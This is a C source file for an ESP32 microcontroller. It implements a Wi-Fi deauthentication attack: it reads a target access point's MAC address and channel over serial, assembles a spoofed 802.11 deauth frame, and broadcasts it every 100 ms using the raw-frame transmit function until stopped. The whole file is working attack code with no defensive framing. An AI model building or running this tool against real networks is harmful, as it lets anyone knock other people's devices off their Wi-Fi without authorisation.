#include "esp_log.h"
#include "wifiInit.h"
#include "frameContents.h"

/*
    This declaration gives access to the esp_wifi_80211_tx function,
    which gives the ability to send raw arbitrary 802.11 frames.
*/
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

uint8_t* frame;

void deauther(){
    // Read the target MAC address from the host
    uint8_t targetBSSID[6];
    for(int i=0; i<6; i++){
        int c;
        do{
            c = getchar();
        }while(c==-1); // If read failed, try again
        targetBSSID[i] = c;
    }

    // Read the channel from the host
    int channel;
    do{
        channel = getchar();
    }while(channel==-1);

    ESP_LOGI("deauther", "Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    ESP_LOGI("deauther", "Channel: %d", channel);

    // Assemble the deauth frame
    frame = (uint8_t*)malloc(26);
    memcpy(frame, deauthFrame_p1, 10);
    memcpy(frame+10, targetBSSID, 6);
    memcpy(frame+16, targetBSSID, 6);
    memcpy(frame+22, deauthFrame_p2, 4);

    while(1){
        // Send the deauth frame every 100ms
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

TaskHandle_t deautherTaskHandle;

void runDeauther(){
    wifiInit(true);
    xTaskCreate(deauther, "deauther", 4096, NULL, 5, &deautherTaskHandle);
    vTaskDelay(500 / portTICK_PERIOD_MS); // Wait for the task to start
    // Start checking for 'q' to stop the task (we can do this now because 500ms is long enough for the deauth task to have read everything it needs from the buffer)
    while(getchar() != 'q'){
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    vTaskDelete(deautherTaskHandle);
    free(frame);
    wifiDeInit();
}
